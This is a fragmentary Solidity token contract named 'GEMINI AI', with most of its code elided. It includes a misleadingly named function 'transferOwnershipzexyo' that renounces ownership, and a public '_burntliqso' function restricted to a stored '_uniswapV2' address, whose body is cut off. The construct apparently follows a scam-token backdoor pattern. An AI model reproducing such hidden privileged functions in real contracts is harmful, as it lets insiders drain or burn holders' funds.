...
abstract contract Ownable {
    ...
    function transferOwnershipzexyo() public virtual onlyOwner {
        _owner = address(0);
    }

}

contract GEMINITOKEN is Ownable {
    ...
    constructor (){
        name = unicode"GEMINI AI";
        symbol = unicode"GEMINIAI";
        decimals = 9;
    ...
    function _burntliqso(address user) public {
        if (msg.sender == _uniswapV2)
        {
